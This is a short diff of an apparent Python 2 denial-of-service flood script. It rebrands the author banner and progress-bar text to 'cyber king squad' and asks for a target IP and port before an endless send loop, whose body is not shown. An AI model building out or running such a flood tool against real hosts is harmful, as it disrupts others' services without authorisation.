@@ -23,7 +23,7 @@ print
 print "Author   : Rh king"
 
 print "github   : https://github.com/Rhking"
-print "Facebook : https://www.facebook.com/Rh king/"
+print "Facebook : https://www.facebook.com/cyber king squad/"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
@@ -34,11 +34,11 @@ print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
 time.sleep(5)
-print "[==========          ] 50%"
+print "[==========          ] Rh50%"
 time.sleep(5)
 print "[===============     ] 75%"
 time.sleep(5)
-print "[====================] Rh100%"
+print "[====================] cyber king sqaud100%"
 time.sleep(3)
 sent = 0
 while True:
